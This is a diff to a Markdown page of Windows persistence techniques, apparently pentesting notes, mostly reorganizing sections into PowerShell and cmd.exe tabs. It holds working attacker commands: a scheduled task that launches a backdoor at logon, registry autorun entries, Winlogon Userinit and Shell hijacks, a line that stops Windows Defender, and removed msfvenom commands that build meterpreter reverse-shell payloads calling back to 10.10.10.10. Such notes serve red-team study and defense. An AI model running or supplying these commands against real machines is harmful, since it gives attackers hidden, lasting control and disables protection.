@@ -54,7 +54,9 @@ attrib -h <C:\path\filename>
 {% endtab %}
 {% endtabs %}
 
-### Registry - HKCU Autoruns
+### Registry - HKCU 
+
+#### Autoruns
 
 {% tabs %}
 {% tab title="PowerShell" %}
@@ -112,6 +114,8 @@ start /b $env:USERPROFILE\AppData\Local\Temp\backdoor.bat
 
 add cmd.exe
 
+{% tabs %}
+{% tab title="PowerShell" %}
 These commands will allow your backdoor to be run when the specified user logs into the machine.  
 
 ```text
@@ -122,6 +126,12 @@ $settings = New-ScheduledTaskSettingsSet
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
 Register-ScheduledTask <taskname> -InputObject $task
 ```
+{% endtab %}
+
+{% tab title="cmd.exe" %}
+These commands will allow your backdoor to be run when the specified user logs into the machine.  
+{% endtab %}
+{% endtabs %}
 
 ### BITS Jobs
 
@@ -232,7 +242,9 @@ sc stop WinDefend
 {% endtab %}
 {% endtabs %}
 
-### Registry - HKLM Autoruns
+### Registry - HKLM 
+
+#### Autoruns
 
 {% tabs %}
 {% tab title="PowerShell" %}
@@ -266,17 +278,25 @@ reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService
 
 #### Winlogon Helper DLL
 
-> Run executable during Windows logon
+{% tabs %}
+{% tab title="PowerShell" %}
+Run backdoor during Windows logon
 
 ```text
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, <backdoor.exe>" -Force
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, <backdoor.exe>" -Force
+```
+{% endtab %}
 
+{% tab title="cmd.exe" %}
+Run backdoor during Windows logon
+
+```text
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
-Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
-Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
 ```
+{% endtab %}
+{% endtabs %}
 
 #### GlobalFlag
 
